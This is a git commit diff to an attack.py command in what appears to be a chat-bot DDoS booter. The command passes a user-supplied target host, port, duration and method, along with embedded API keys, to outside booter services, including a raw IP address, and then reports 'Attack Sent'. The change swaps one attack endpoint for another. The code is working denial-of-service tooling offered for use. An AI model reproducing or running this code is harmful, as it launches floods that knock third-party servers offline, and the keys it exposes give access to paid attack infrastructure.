287739136e54a79b5d45dbd412b2fe02a720ac63
0xLuLz <87556649+0xLulz@users.noreply.github.com>
2022-02-25 10:58:07 -0800

    Update attack.py

--- src/commands/attack_cmds/attack.py
+++ src/commands/attack_cmds/attack.py
@@ -14,7 +14,7 @@ async def attack(client, fmsg, cmd, args):
     # if ipv4_check(args[1]) == 0:
     #     return (await embed(client, "Error", "[x] The IPv4 HOST you've provided is not a valid IPv4!"))
     api_response = requests.get("https://api.leakz.org/fbiVIP.php?key=kkris.13371659G92YT91T0SDFG91&host=" + args[1] + "&port=" + args[2] + "&time=" + args[3] + "&method=" + args[4]).text
-    api_response1 = requests.get("https://traced.skrillec.pw/attack?key=tFPZ8EGnNrxhM6XSCqZTvg&host=" + args[1] + "&port=" + args[2] + "&time=" + args[3] + "&type=" + args[4]).text
+    api_response1 = requests.get("http://51.161.98.213:999/attack?key=tFPZ8EGnNrxhM6XSCqZTvg&host=" + args[1] + "&port=" + args[2] + "&time=" + args[3] + "&method=" + args[4]).text
     print(api_response)
     print(api_response1)
     await embed(client, "Attack Sent", f"Attack Successfully sent to " + args[1] + ":" + args[2] + " for " + args[3] + " seconds with " + args[4] + "!")
